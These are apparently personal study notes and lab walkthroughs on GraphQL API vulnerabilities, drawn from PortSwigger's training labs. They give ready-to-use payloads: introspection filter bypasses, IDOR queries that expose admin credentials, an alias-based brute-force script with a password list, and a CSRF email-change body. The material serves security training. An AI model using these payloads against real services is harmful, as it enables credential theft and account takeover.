# GraphQL API vulnerabilities

[Portswigger](https://portswigger.net/web-security/graphql)

## Methodology

The data described by a GraphQL schema can be manipulated using three types of operation:

- Queries fetch data.
- Mutations add, change, or remove data.
- Subscriptions are similar to queries, but set up a permanent connection by which a server can proactively push data to a client in the specified format.


### Finding GraphQL endpoints

sending `query{__typename}` to any graphql endpoint will have it respond with the string `"data": {"__typename": "query"}}` somewhere in its response, sending this to any query will help determine if it is a graphql endpoint

**common endpoint names**

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
```

you could also try appending /v1 to the path

**request methods**

graphql will usually only accept POST requests with the content-type as `application/json`, however some endpoints may accept alternative methods such as GET requests and may use content-type `x-www-form-urlencoded`

**IDOR Possibilities**

If you see sequential ID's in a product or similar and maybe missing one, like in the case where you have 1,2, and 4, but missing 3, query for 3. This is testing for access control issues involving IDORs.

### Discovering schema information

You can run introspection query's to pull data off the graphql like the intro

NOTE: Burp can run introspection queries for you example [here](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql#accessing-graphql-api-schemas-using-introspection)

sample introspection query:

```
{
"query": "{__schema{queryType{name}}}"
}
```

You can also run a full introspection query to grab all the data you can with:

```
query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```


Note: If introspection is enabled but the above query doesn't run, try removing the onOperation, onFragment, and onField directives from the query structure. Many endpoints do not accept these directives as part of an introspection query, and you can often have more success with introspection by removing them.

To make sense of this you can use the [graphql visualizer](http://nathanrandal.com/graphql-visualizer/)

### Bypassing GraphQL introspection defenses

If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the `__schema` keyword. if the developer has only excluded __schema{, then the below introspection query would not be excluded

```
{
"query": "query{__schema
{queryType{name}}}"
}
```

If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type of `x-www-form-urlencoded`

Example below shows an introspection probe sent via GET, with URL-encoded parameters:

```
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

### Bypassing rate limiting using aliases

Can use alias' to bypass rate limiting based on HTTP requests by using alias' to send multiple requests in one.

The simplified example below shows a series of aliased queries checking whether store discount codes are valid. This operation could potentially bypass rate limiting as it is a single HTTP request, even though it could potentially be used to check a vast number of discount codes at once. 

```
query isValidDiscount($code: Int) {
       isvalidDiscount(code:$code){
           valid
       }
       isValidDiscount2:isValidDiscount(code:$code){
           valid
       }
       isValidDiscount3:isValidDiscount(code:$code){
           valid
       }
   }
```

### GraphQL CSRF

GraphQL can be used as a vector for CSRF attacks, whereby an attacker creates an exploit that causes a victim's browser to send a malicious query as the victim user. 

CSRF vulnerabilities can arise where a GraphQL endpoint does not validate the content type of the requests sent to it and no CSRF tokens are implemented.

POST requests that use a content type of application/json are secure against forgery as long as the content type is validated. In this case, an attacker wouldn't be able to make the victim's browser send this request even if the victim were to visit a malicious site. 

Alternative methods such as GET, or any request that has a content type of x-www-form-urlencoded, can be sent by a browser and so may leave users vulnerable to attack if the endpoint accepts these requests. Where this is the case, attackers may be able to craft exploits to send malicious requests to the API. 

## Labs walkthrough

### Accessing private GraphQL posts

Background:

```
The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password. 
```

**Identify the vulnerability**
- access the blog page
- in burp history notice the following
  - blog posts are retrieved using a graphql query
  - in the response to the graphql query, each blog post has its own sequential `id`
  - blog post `id` 3 is missing from the list, this indicates that there is a hidden blog post
- find the `POST /graphql/v1` request and send to repeater
- in repeater right-click anywhere in the request panel of the message and select `GraphQL > Set introspection query` to insert an introspection query into the request body
- send the request

**Exploit the vulnerability to find the password**
- in the HTTP history find the `POST /graphql/v1` request and send to repeater
- in repeater click on the `GraphQL` tab, in the `variables` panel modify the `id` to 3
- in the  `Query` panel add the `postPassword` field to the query
- send the request
- copy the contents of the responses `postPassword` field and submit to complete

### Accidental exposure of private GraphQL fields

Background:

```
The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username carlos
```

**Identify the vulnerability**
- in burps browser access the lab and select `my account`
- attempt to log in to the site
- in burp history notice that the login is sent as a graphql mutation
- send this request to repeater
- in repeater right click anywhere in the message and select `GraphQL > Set introspection query` to insert an introspection query into the request body
- send the request
- Right-click the message and select `GraphQL > Save GraphQL queries to site map`
- Go to `Target > Site map` and review the GraphQL queries. Notice the following
  - There is a `getUser` query that returns a user's username and password
  - This query fetches the relevant user information via a direct reference to an `id` number
 
**Modify the query to retrieve the administrator credentials**
- right click on the `getUser` query and send it to repeater
- in repeater click send, notice that the default id value of 0 doesn't return a user
- change the id value to 1 and resend and see the administrators credentials in the response
- log in to the site as the administrator, go to the `admin` panel and delete carlos

### Finding a hidden GraphQL endpoint

Background:

```
The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete carlos
```

**Find the hidden GraphQL endpoint**
- in repeater send the requests to some common graphql endpoint suffixes and inspect the results
- note that when you send a GET request to `/api` the response contains a `query not present` error
- amend the request to contain a universal query: `/api?query=query{__typename}`
- the response comes back as:

```
{
  "data": {
    "__typename": "query"
  }
}
```

**Overcome the introspection defenses**
- send a new request with a URL-encoded introspection query as a query parameter. To do this, right-click the request and select `GraphQL > Set introspection query`

```
/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

- notice from the response that introspection is disallowed
- modify the query to include a newline character after `__schema`

```
/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

- Notice that the response now includes full introspection details. This is because the server is configured to exclude queries matching the regex "__schema{", which the query no longer matches even though it is still a valid introspection query

**Exploit the vulnerability to delete carlos**
- Right-click the request and select `GraphQL > Save GraphQL queries to site map`
- go to the `target > site map` to see the API queries, use the `graphql` tab and find the `getUser`query, right click the request and select `send to repeater`
- in repeater send the `getUser` query to the endpoint you discovered:

```
{
"data": {
"getUser": null
}
}
```

- click on the graphql tab and change the `id` variable to find `carlos` user ID
- in `target > site map` browse the schema again and find the `deleteOrganizationUser` mutation, notice that this mutation takes a user ID as a parameter
- send the request to repeater
- in repeater send a `deleteOrganizationUser` mutation with a user ID of `3` to delete `carlos`:

```
/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
```

### Bypassing GraphQL brute force protections

Background:

```
The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source. 
```

Tip: 

This lab requires you to craft a large request that uses aliases to send multiple login attempts at the same time. As this request could be time-consuming to create manually, we recommend you use a script to build the request.

The below example JavaScript builds a list of aliases corresponding to our list of authentication lab passwords and copies the request to your clipboard. To run this script:

    Open the lab in Burp's browser.
    Right-click the page and select Inspect.
    Select the Console tab.
    Paste the script and press Enter.

You can then use the generated aliases when crafting your request in Repeater. 

```
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");

```

- in lab select `my account`
- attempt to log in to the site using incorrect credentials
- go to burp history and note that the login request are sent as a graphql mutation, send this to repeater
- in repeater attempt some further login requests with incorrect credentials, notice that after a short period of time the API starts to return a rate limit error
- in the graphql tab, craft a request that uses aliases to send multiple login mutations in one message, see the tip in this lab above for a method that makes this process less time-consuming
  - Bear the following in mind when constructing your request:
  - The list of aliases should be contained within a `mutation {}` type
  - Each aliased mutation should have the username `carlos` and a different password from the authentication list
  - If you are modifying the request that you sent to Repeater, delete the variable dictionary and operationName field from the request before sending. You can do this from Repeater's `pretty` tab
  - Ensure that each alias requests the `success` field, as shown in the simplified example below

```
    mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...

          bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
              token
              success
          }
    }
```

- click `send`
- notice that the response lists each login attempt and whether its login attempt was successful
- use the search bar below the response to search for the string `true`, this entry is our login creds
- use above creds to sign in as carlos

### Performing CSRF exploits over GraphQL

Background:

```
The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of x-www-form-urlencoded and is therefore vulnerable to cross-site request forgery (CSRF) attacks.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address, then upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter
```

- in burps browser log in to your account
- enter a new email address, then click `update email`
- in burp history check the resulting request, note that the email change is sent as a graphql mutation
- right click the email change request and select `send to repeater`
- in repeater emend the graphql query to change the email to a second different address
- click send
- in the response, notice that the email has changed again, this indicates that you can reuse a session cookie to send multiple requests
- convert the request into a POST request with a Content-type of `x-www-form-urlencoded`, can do this by using the `change request method` twice
- notice the mutation request body has been deleted, add the request body back in the URL encodign the body should look like the below:

```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

- right click the request and select `engagement tools > generate CSRF PoC` burp displays the CSRF PoC generator dialog
- amend the HTML in the `CSRF PoC generator` dialog so that it changes the email a third time, this step is necessary because otherwise the exploit won't make any changes to the current email address at the time it is run. Likewise, if you test the exploit before delivering make sure that you change the email from whatever it is currently set to before delivering to the victim
- copy the HTML, and go to the exploit server
- paste the HTML into the exploit server and click `deliver exploit to victim`
- 


